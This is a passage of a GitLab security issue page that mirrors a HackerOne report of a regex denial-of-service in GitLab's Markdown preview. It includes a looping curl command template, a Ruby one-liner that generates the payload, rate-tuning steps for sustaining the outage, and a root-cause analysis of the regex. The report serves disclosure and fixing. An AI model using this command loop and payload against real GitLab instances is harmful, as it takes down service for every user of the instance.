directory of the command console to the directory where `ProjectReferenceFilter_ReDoS_payload.json` is saved.  \n11. Run the command constructed in step 9 in the command console, and confirm the significant consumption of CPU resource.  \nFor reference, when I ran the above command, the CPU resource of my instance with 16 CPU cores and 32GB of memory was quickly exhausted.\n\n![htop_all_cores_exhausted.png](https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png)\n\nIn an instance with performance close to the [1k Reference Architecture (with 8 CPU cores, 7.2GB memory)](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html), this CPU resource consumption causes noticeable performance degradation in tens of seconds, and visibly delays response to all other users.\n\n![response_delay.png](https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png)\n\nUnless the crafted command is interrupted, this performance degradation will continue and get worse until the instance becomes completely unresponsive.\n\n_NOTE: If you can confirm a surge in CPU usage at step 11, that&#39;s enough confirmation that this bug is a valid ReDoS vulnerability, based on past valid reports._\n\n_NOTE 2: This crafted command will keep sending requests until you force it to stop. Please be sure to terminate the command after confirming the vulnerability._\n\n######  Details about the command constructed in step 9:  \nThe executed command send 1 request per second, and each 1 request that triggers ReDoS exhaust the resources of 1 CPU core.  \nThe GitLab instance has the default timeout of 60 seconds per request. However, because the load per request is too high, there are many worker processes that do not finish processing even after the timeout has passed.\n\n\n####  Additional informations to confirm this vulnerability meets the `A:H` criteria\n\n**_IMPORTANT NOTE: This section contains additional information to confirm that this vulnerability meets the criteria for `A:H`. Please use this information after triage, as this section contains time-consuming steps and may be an over-verification of whether this report is valid._**\n\nIf the GitLab instance is attacked at a well-tuned RPS(requests per second) rate for a reasonable amount of time, then as long as the attack continues, the instance will take 60+ seconds to process every single request.  \nThis indicates that timeouts are not working well under heavy load.  \nAs a result, `500 error` will be returned for each and every request.\n\n![500_error.png](https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png)\n\nI describe below how to attack at a well-tuned RPS rate for a reasonable amount of time **by using the command constructed in step 9 of \&quot;Steps to reproduce\&quot; section** of this report.\n\n1. Before running the constructed command, maintain separate session as an authenticated user by signing into the instance with a different browser than the one that obtained the unauthenticated user&#39;s CSRF token and session.\n\n2. Iterate on executing the constructed command and adjusting the RPS rate.  \n   The constructed command will display the PIDs of the spawned `curl` processes and the responses from the instance in the console.  \n   Please adjust the RPS rate as described below so that 1 or 2 PIDs and several `500 error` responses are alternately displayed.  \n   * We can adjust the RPS rate by changing the `sleep` value at the end of the command. For example, changing to `sleep 1;` will result in `RPS = 1`, `sleep 0.5;` will result in `RPS = 2`, and `sleep 2;` will result in `RPS = 0.5`.  \n   * We need to adjust the RPS rate so that [it does not exceed the \&quot;Test RPS rates\&quot; (discribed in \&quot;Clarifying notes\&quot;)](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes). As an example, for the [1k Reference Architecture](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html), \&quot;Test RPS rates\&quot; is 2 RPS.\n\n   _NOTE: Since the default timeout is 60 seconds, we need to wait a few minutes after executing the command to see the PID and error response alternately displayed. There is no problem if the PIDs is displayed continuously occasionally, but if it is clearly not working, please stop the command and adjust the RPS rate._\n\n3. **With the tuned command still running**, visit any page on the instance with the authenticated user&#39;s session maintained in step 1 of this section.  \n   And check if the `500 error` is returned after a response delay of 60+ seconds.  \n   After you start getting `500 errors` for authenticated requests, wait tens of minutes and you&#39;ll start getting `500 errors` for unauthenticated requests and requests to the API.\n\n   _NOTE: This behavior seems to occur because handling authenticated requests tends to be more complex than handling unauthenticated requests._\n\n\nWhen I tested it on my instance, it took about 10-20 minutes at a rate of 1 RPS for my instance (16 CPU cores and 32GB of memory) to reach the above DoS state.  \nAdditionally, in a pipeline that started overlapping the above DoS state, the jobs failed with timeout because the runner was unable to communicate with the instance, and subsequent job on the pipeline was not run.\n\n![failed_pipeline.png](https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png)  \n![failed_jobs_timeout.png](https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png)\n\nAlso, when I looked at the runner logs in this state, I could see that the runner was failing to pick up the jobs.  \n```  \n$ sudo docker logs my_runner_container  \n[...snip...]  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \n```  \n(Since I was using the [`gitlab/gitlab-runner:alpine` image](https://docs.gitlab.com/runner/install/docker.html#docker-images) for testing, I ran `docker logs` command to see the runner logs.)\n\nThese mean that the instance has been completely taken down, so this vulnerability fully meets [`A:H` criteria](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes).\n\n\n####  What is the current bug behavior?\n\nAlthough the behavior of this ReDoS bug isn&#39;t overly complicated, it&#39;s a bit tedious to get to the root cause from the observed DoS state.  \nSo I would like to explain this bug step by step by looking at the stack trace and source code.\n\nLooking at the stack trace at timeout, at first glance `ProjectReferenceFilter` does not seem to be the cause of this bug.  \n```  \nlib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches&#39;  \nlib/banzai/filter/references/reference_filter.rb:50:in `block in call&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each_with_index&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `call&#39;  \n(...snip...)  \n```\n\nLet&#39;s look at the line 209 in `reference_filter.rb` where the timeout occurred.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L208-209  \n```ruby  \n        def replace_text_when_pattern_matches(node, index, pattern)  \n          return unless node.text =~ pattern  \n```\n\nThere is no doubt that a ReDoS has occurred because of `node.text =~ pattern`.  \nLet&#39;s take a look at the code on line 50 that calls `ReferenceFilter::replace_text_when_pattern_matches` method.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L45-50  \n```ruby  \n        def call  \n          ref_pattern_start = /\\A#{object_reference_pattern}\\z/\n\n          nodes.each_with_index do |node, index|  \n            if text_node?(node)  \n              replace_text_when_pattern_matches(node, index, object_reference_pattern) do |content|  \n```\n\nThis `call` method gets the regex pattern by calling `self.object_reference_pattern`.  \nWhen I added the debug code below and tested it, I found that `self.class` just before the timeout was `ProjectReferenceFilter`.\n\n```diff  \n        def call  \n          ref_pattern_start = /\\A#{object_reference_pattern}\\z/  \n+\n+         puts self.class.inspect       #=\u003e Banzai::Filter::References::ProjectReferenceFilter\n\n          nodes.each_with_index do |node, index|  \n            if text_node?(node)  \n              replace_text_when_pattern_matches(node, index, object_reference_pattern) do |content|  \n```\n\nLet&#39;s look at the definitions of `ProjectReferenceFilter.object_reference_pattern`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/project_reference_filter.rb#L30-32  \n```ruby  \n        def object_reference_pattern  \n          [@]object_reference_pattern ||= Project.markdown_reference_pattern  \n        end  \n```\n\nIt looks like we will reach the goal soon.  \nLet&#39;s look at the definitions of `Project.markdown_reference_pattern`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L915-921  \n```ruby  \n    def markdown_reference_pattern  \n      [@]markdown_reference_pattern ||=  \n        %r{  \n          #{reference_pattern}  \n          (#{reference_postfix}|#{reference_postfix_escaped})  \n        }x  \n    end  \n```\n\nLet&#39;s also look at the definitions of `reference_pattern`, `reference_postfix` and `reference_postfix_escaped`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L896-910  \n```ruby  \n    def reference_pattern  \n      %r{  \n        (?\u003c!#{Gitlab::PathRegex::PATH_START_CHAR})  \n        ((?\u003cnamespace\u003e#{Gitlab::PathRegex::FULL_NAMESPACE_FORMAT_REGEX})/)?  \n        (?\u003cproject\u003e#{Gitlab::PathRegex::PROJECT_PATH_FORMAT_REGEX})  \n      }xo  \n    end\n\n    def reference_postfix  \n      &#39;\u003e&#39;  \n    end\n\n    def reference_postfix_escaped  \n      &#39;\u0026gt;&#39;  \n    end  \n```\n\n`Project.markdown_reference_pattern` method builds the final regex pattern by combining `reference_pattern`, `reference_postfix` and `reference_postfix_escaped`.  \nSo, the regex pattern that is finally constructed by `Project.markdown_reference_pattern` method is as follows:  \n```ruby  \n/\n          (?x-mi:  \n        (?\u003c![a-zA-Z0-9_\\.])  \n        ((?\u003cnamespace\u003e(?-mix:((?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*[a-zA-Z0-9_\\-]|[a-zA-Z0-9_])(?-mix:(?\u003c!\\.git|\\.atom)))\\/){,20}(?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*[a-zA-Z0-9_\\-]|[a-zA-Z0-9_])(?-mix:(?\u003c!\\.git|\\.atom)))))\\/)?  \n        (?\u003cproject\u003e(?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*)(?-mix:(?\u003c!\\.git|\\.atom))))  \n      )  \n          (\u003e|\u0026gt;)  \n        /x  \n```\n\nMatching this regex pattern with the payload contained in `ProjectReferenceFilter_ReDoS_payload.json` causes severe backtracking.  \nThe `(\u003e|\u0026gt;)` at the end of this pattern is typical of the backtracking triggers.  \nThe regex engine keeps wandering around looking for character `\u003e` or string `\u0026gt;` that doesn&#39;t exist in `ProjectReferenceFilter_ReDoS_payload.json`.\n\n_NOTE: The crafted payload in `ProjectReferenceFilter_ReDoS_payload.json` can be easily generated with the Ruby code `\&quot;mailto:\&quot; + \&quot;a-\&quot; * 499_000 + \&quot;[@]aaaaaaaa..aaaaaaaa.example.com\&quot;`._\n\n####  What is the expected correct behavior?\n\nA typical technique for fixing the ReDoS is to rewrite the code without using regex matching.  \nHowever, in this case, rewriting the code to not use regex matching could break consistency with other features.  \nSo, if we also care about consistency with other features, we need to rewrite the regex pattern `(\u003e|\u0026gt;)` nicely to prevent backtracking.\n\n####  Relevant logs and/or screenshots  \nI put references to the screenshots at the appropriate places in this report.  \nI also attach the stack trace when one request was forcefully stopped after 60+ seconds.  \n```  \nRack::Timeout::RequestTimeoutException (Request ran for longer than 60000ms ):  \n    \nlib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches&#39;  \nlib/banzai/filter/references/reference_filter.rb:50:in `block in call&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each_with_index&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `call&#39;  \nlib/banzai/filter/references/reference_filter.rb:42:in `block in call_and_update_nodes&#39;  \nlib/banzai/filter/references/reference_filter.rb:291:in `with_update_nodes&#39;  \nlib/banzai/filter/references/reference_filter.rb:42:in `call_and_update_nodes&#39;  \nlib/banzai/filter/references/reference_filter.rb:30:in `call&#39;  \nlib/banzai/pipeline/base_pipeline.rb:23:in `block (2 levels) in singleton class&#39;  \nlib/banzai/renderer.rb:130:in `render_result&#39;  \nlib/banzai/renderer.rb:166:in `cacheless_render&#39;  \nlib/banzai/renderer.rb:30:in `render&#39;  \nlib/banzai/renderer.rb:120:in `block in cache_collection_render&#39;  \nlib/banzai/renderer.rb:119:in `each&#39;  \nlib/banzai/renderer.rb:119:in `cache_collection_render&#39;  \nlib/banzai/reference_extractor.rb:33:in `html_documents&#39;  \nlib/banzai/reference_extractor.rb:18:in `references&#39;  \nlib/gitlab/reference_extractor.rb:24:in `references&#39;  \nlib/gitlab/reference_extractor.rb:43:in `block (2 levels) in \u003cclass:ReferenceExtractor\u003e&#39;  \napp/services/preview_markdown_service.rb:33:in `find_user_references&#39;  \napp/services/preview_markdown_service.rb:6:in `execute&#39;  \napp/controllers/concerns/preview_markdown.rb:8:in `preview_markdown&#39;  \nee/lib/gitlab/ip_address_state.rb:10:in `with&#39;  \nee/app/controllers/ee/application_controller.rb:45:in `set_current_ip_address&#39;  \napp/controllers/application_controller.rb:524:in `set_current_admin&#39;  \nlib/gitlab/session.rb:11:in `with_session&#39;  \napp/controllers/application_controller.rb:515:in `set_session_storage&#39;  \nlib/gitlab/i18n.rb:107:in `with_locale&#39;  \napp/controllers/application_controller.rb:508:in `set_locale&#39;  \napp/controllers/application_controller.rb:499:in `set_current_context&#39;  \nlib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call&#39;  \nlib/gitlab/middleware/memory_report.rb:13:in `call&#39;  \nlib/gitlab/middleware/speedscope.rb:13:in `call&#39;  \nlib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call&#39;  \nlib/gitlab/middleware/rails_queue_duration.rb:33:in `call&#39;  \nlib/gitlab/metrics/rack_middleware.rb:16:in `block in call&#39;  \nlib/gitlab/metrics/web_transaction.rb:46:in `run&#39;  \nlib/gitlab/metrics/rack_middleware.rb:16:in `call&#39;  \nlib/gitlab/jira/middleware.rb:19:in `call&#39;  \nlib/gitlab/middleware/go.rb:20:in `call&#39;  \nlib/gitlab/etag_caching/middleware.rb:21:in `call&#39;  \nlib/gitlab/middleware/query_analyzer.rb:11:in `block in call&#39;  \nlib/gitlab/database/query_analyzer.rb:37:in `within&#39;  \nlib/gitlab/middleware/query_analyzer.rb:11:in `call&#39;  \nlib/gitlab/middleware/multipart.rb:173:in `call&#39;  \nlib/gitlab/middleware/read_only/controller.rb:50:in `call&#39;  \nlib/gitlab/middleware/read_only.rb:18:in `call&#39;  \nlib/gitlab/middleware/same_site_cookies.rb:27:in `call&#39;  \nlib/gitlab/middleware/basic_health_check.rb:25:in `call&#39;  \nlib/gitlab/middleware/handle_malformed_strings.rb:21:in `call&#39;  \nlib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call&#39;  \nlib/gitlab/middleware/request_context.rb:21:in `call&#39;  \nlib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call&#39;  \nconfig/initializers/fix_local_cache_middleware.rb:11:in `call&#39;  \nlib/gitlab/middleware/compressed_json.rb:37:in `call&#39;  \nlib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call&#39;  \nlib/gitlab/middleware/sidekiq_web_static.rb:20:in `call&#39;  \nlib/gitlab/metrics/requests_rack_middleware.rb:79:in `call&#39;  \nlib/gitlab/middleware/release_env.rb:13:in `call&#39;  \n```\n\n####  Output of checks  \nThis bug happens on the official Docker installation of GitLab Enterprise Edition `15.11.0-ee`.  \nI used `Chromium 112` and `Firefox 112` on Debian 11 to verify this bug.\n\n######  Results of GitLab environment info  \nOutput of `sudo gitlab-rake gitlab:env:info`:  \n```  \nSystem information  \nSystem:\t\t  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t3.0.6p216  \nGem Version:\t3.2.33  \nBundler Version:2.3.15  \nRake Version:\t13.0.6  \nRedis Version:\t6.2.11  \nSidekiq Version:6.5.7  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t15.11.0-ee  \nRevision:\t4dce6bc3728  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t13.8  \nURL:\t\thttp://my-gitlab-h1.test  \nHTTP Clone URL:\thttp://my-gitlab-h1.test/some-group/some-project.git  \nSSH Clone URL:\tgit@my-gitlab-h1.test:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers: \n\nGitLab Shell  \nVersion:\t14.18.0  \nRepository storages:  \n- default: \tunix:/var/opt/gitlab/gitaly/gitaly.socket  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Impact\n\nBy exploiting this ReDoS vulnerability, an unauthenticated attacker could significantly reduce the availability of the entire the GitLab instance.  \nBased on [the policy of GitLab&#39;s Bug Bounty Program](https://hackerone.com/gitlab?view_policy=true), past reports, and my research on the impact of this bug, I would suggest the following CVSS score:  \n```  \nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n7.5 (High)  \n```  \nI would also like to add some detailed explanations of the notable points in the above score.\n\n* `PR:N` : As described in the \&quot;Steps to reproduce\&quot; section, this attack can be performed by an unauthenticated attacker.\n\n* `A:H` : This ReDoS attack causes enough load to meet the `A:H` criteria for the [1k Reference Architecture](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html) as stated in [GitLab CVSS Calculator page](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/).  \nMore specifically, this attack clearly satisfies the \&quot;Clarifying notes\&quot; condition in [GitLab CVSS Calculator page](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/).  \n\u003e When evaluating Availability impacts for DoS that require sustained traffic, use the [1k Reference Architecture](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html). The number of requests must be fewer than the \&quot;test request per seconds rates\&quot; and cause 10+ seconds of user-perceivable unavailability to rate the impact as `A:H`.\n\nIn addition to the above, it is important to note that any feature with Markdown fields is vulnerable to this ReDoS attack.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [ProjectReferenceFilter_ReDoS_payload.json](https://h1.sec.gitlab.net/a/1892d7aa-a873-45b2-ab68-9926e8fa5cb2/ProjectReferenceFilter_ReDoS_payload.json)\n* [create_public_group_updated.png](https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png)\n* [csrf_token.png](https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png)\n* [session_value.png](https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png)\n* [htop_all_cores_exhausted.png](https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png)\n* [response_delay.png](https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png)\n* [500_error.png](https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png)\n* [failed_pipeline.png](https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png)\n* [failed_jobs_timeout.png](https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;gitlab-org/gitlab&quot;,&quot;iid&quot;:416225,&quot;issuableId&quot;:129825140,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2741139,&quot;authorName&quot;:&quot;GitLab SecurityBot&quot;,&quot;authorUsername&quot;:&quot;gitlab-securitybot&quot;,&quot;authorWebUrl&quot;:&quot;/gitlab-securitybot&quot;,&quot;createdAt&quot;:&quot;2023-06-26T04:15:17+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:278964,&quot;projectPath&quot;:&quot;gitlab&quot;,&quot;projectNamespace&quot;:&quot;gitlab-org&quot;,&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">ReDoS via ProjectReferenceFilter in any Markdown fields</h1>
</div>
<div class="description">
<div class="md"><p data-sourcepos="1:1-1:247" dir="auto"><gl-emoji title="warning sign" data-name="warning" data-unicode-version="4.0">⚠</gl-emoji> <strong data-sourcepos="1:11-1:247">Please read <a data-sourcepos="1:25-1:125" href="https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md">the process</a> on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.</strong></p>&#x000A;<p data-sourcepos="3:1-3:99" dir="auto"><strong data-sourcepos="3:1-3:70"><a data-sourcepos="3:3-3:68" href="https://hackerone.com/reports/1963255" rel="nofollow noreferrer noopener" target="_blank">HackerOne report #1963255</a></strong> by <code data-sourcepos="3:76-3:83">ryhmnlfj</code> on 2023-04-27:</p>&#x000A;<p data-sourcepos="5:1-5:87" dir="auto"><a data-sourcepos="5:1-5:17" href="#report">Report</a> | <a data-sourcepos="5:21-5:47" href="#attachments">Attachments</a> | <a data-sourcepos="5:51-5:87" href="#how-to-reproduce">How To Reproduce</a></p>&#x000A;<h2 data-sourcepos="7:1-7:9" dir="auto">&#x000A;<a id="user-content-report" class="anchor" href="#report" aria-hidden="true"></a>Report</h2>&#x000A;<h4 data-sourcepos="9:1-9:13" dir="auto">&#x000A;<a id="user-content-summary" class="anchor" href="#summary" aria-hidden="true"></a>Summary</h4>&#x000A;<p data-sourcepos="11:1-12:159" dir="auto">I found the server-side ReDoS via <code data-sourcepos="11:36-11:57">ProjectReferenceFilter</code> in any Markdown fields.<br data-sourcepos="11:85-11:85">&#x000A;An attacker can take down the GitLab instance by sending the <strong data-sourcepos="12:62-12:89">unauthenticated requests</strong> which contain the crafted payload to the <code data-sourcepos="12:133-12:148">preview_markdown</code> endpoint.</p>&#x000A;<h4 data-sourcepos="14:1-14:44" dir="auto">&#x000A;<a id="user-content-preparation-before-reproducing-the-bug" class="anchor" href="#preparation-before-reproducing-the-bug" aria-hidden="true"></a>Preparation before reproducing the bug</h4>&#x000A;<p data-sourcepos="16:1-18:66" dir="auto">Please install the command line tools <code data-sourcepos="16:40-16:43">ruby</code> and <code data-sourcepos="16:51-16:54">curl</code> on your computer.<br data-sourcepos="16:76-16:76">&#x000A;Also, please download <code data-sourcepos="17:24-17:64">ProjectReferenceFilter_ReDoS_payload.json</code> attached to this report.<br data-sourcepos="17:93-17:93">&#x000A;These will be used in step 11 of the "Steps to reproduce" section.</p>&#x000A;<p data-sourcepos="20:1-21:84" dir="auto">And most importantly, please prepare a GitLab instance that you can use personally.<br data-sourcepos="20:86-20:86">&#x000A;<strong data-sourcepos="21:1-21:84">DO NOT try to reproduce this bug against <code data-sourcepos="21:45-21:54">gitlab.com</code> or other public instances.</strong></p>&#x000A;<h4 data-sourcepos="23:1-23:24" dir="auto">&#x000A;<a id="user-content-steps-to-reproduce" class="anchor" href="#steps-to-reproduce" aria-hidden="true"></a>Steps to reproduce</h4>&#x000A;<ol data-sourcepos="25:1-29:0" dir="auto">&#x000A;<li data-sourcepos="25:1-25:76">Set up and launch your GitLab instance, and create a new account on it.</li>&#x000A;<li data-sourcepos="26:1-26:50">Sign in to the account you created in step 1.</li>&#x000A;<li data-sourcepos="27:1-29:0">Create a new <strong data-sourcepos="27:17-27:32">public group</strong> and make a note of <strong data-sourcepos="27:53-27:77">the public group name</strong> at this time.<br data-sourcepos="27:94-27:94">&#x000A;At the same time, make a note of <strong data-sourcepos="28:37-28:64">the base URL with scheme</strong> shown in "Group URL".</li>&#x000A;</ol>&#x000A;<p data-sourcepos="30:1-30:132" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/b75147f8ef878dfa20ac2f5e55f8b17cd3cb54c4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34633639333532312d336136652d343162612d623133352d6566333965363565633561392f6372656174655f7075626c69635f67726f75705f757064617465642e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png"><img data-sourcepos="30:1-30:132" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="create_public_group_updated.png" data-canonical-src="https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/b75147f8ef878dfa20ac2f5e55f8b17cd3cb54c4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34633639333532312d336136652d343162612d623133352d6566333965363565633561392f6372656174655f7075626c69635f67726f75705f757064617465642e706e67"></a></p>&#x000A;<ol data-sourcepos="32:1-35:0" start="4" dir="auto">&#x000A;<li data-sourcepos="32:1-32:89">Sign out as you will be accessing as an unauthenticated user in the following steps.</li>&#x000A;<li data-sourcepos="33:1-33:133">After launching your browser's developer tools, browse to the <strong data-sourcepos="33:66-33:81">public group</strong> you created in step 3 as an unauthenticated user.</li>&#x000A;<li data-sourcepos="34:1-35:0">Check the HTML rendered in step 5 and take a note of the content of <code data-sourcepos="34:73-34:82">csrf-token</code> at this time.</li>&#x000A;</ol>&#x000A;<p data-sourcepos="36:1-36:98" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/2615aa289fca96f983b8f600e0e128f5ddb8c28e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37373738303031652d383532612d346137642d613030312d3262616137336331633861652f637372665f746f6b656e2e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png"><img data-sourcepos="36:1-36:98" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="csrf_token.png" data-canonical-src="https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/2615aa289fca96f983b8f600e0e128f5ddb8c28e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37373738303031652d383532612d346137642d613030312d3262616137336331633861652f637372665f746f6b656e2e706e67"></a></p>&#x000A;<ol data-sourcepos="38:1-39:0" start="7" dir="auto">&#x000A;<li data-sourcepos="38:1-39:0">Check the request sent to your GitLab instance in step 5 and take a note the value of <code data-sourcepos="38:91-38:105">_gitlab_session</code> at this time.</li>&#x000A;</ol>&#x000A;<p data-sourcepos="40:1-40:104" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/90b6d161551dfaa71299865e08e0650f5f9ba20c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32373838353066642d386630322d346431392d616436372d6536313033653663333837662f73657373696f6e5f76616c75652e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png"><img data-sourcepos="40:1-40:104" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="session_value.png" data-canonical-src="https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/90b6d161551dfaa71299865e08e0650f5f9ba20c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32373838353066642d386630322d346431392d616436372d6536313033653663333837662f73657373696f6e5f76616c75652e706e67"></a></p>&#x000A;<ol data-sourcepos="42:1-44:0" start="8" dir="auto">&#x000A;<li data-sourcepos="42:1-42:51">Close your browser and open a command console.</li>&#x000A;<li data-sourcepos="43:1-44:0">Let's construct the command to demonstrate the ReDoS. Replace each string in the command template according to the replacement table.</li>&#x000A;</ol>&#x000A;<ul data-sourcepos="45:1-45:21" dir="auto">&#x000A;<li data-sourcepos="45:1-45:21">Command template:</li>&#x000A;</ul>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="46:1-48:5" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">ruby -e 'while true do p spawn("curl --header Content-Type:application/json --header X-CSRF-Token:[CSRF_TOKEN_VALUE] --header Cookie:_gitlab_session=[SESSION_VALUE] --data [@]ProjectReferenceFilter_ReDoS_payload.json [BASE_URL_WITH_SCHEME]groups/[PUBLIC_GROUP_NAME]/preview_markdown"); sleep 1; end'  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<ul data-sourcepos="49:1-50:0" dir="auto">&#x000A;<li data-sourcepos="49:1-50:0">Replacement table:</li>&#x000A;</ul>&#x000A;<table data-sourcepos="51:1-56:84" dir="auto">&#x000A;<thead>&#x000A;<tr data-sourcepos="51:1-51:86">&#x000A;<th data-sourcepos="51:2-51:34">String in the command template</th>&#x000A;<th data-sourcepos="51:36-51:83">Replace with</th>&#x000A;</tr>&#x000A;</thead>&#x000A;<tbody>&#x000A;<tr 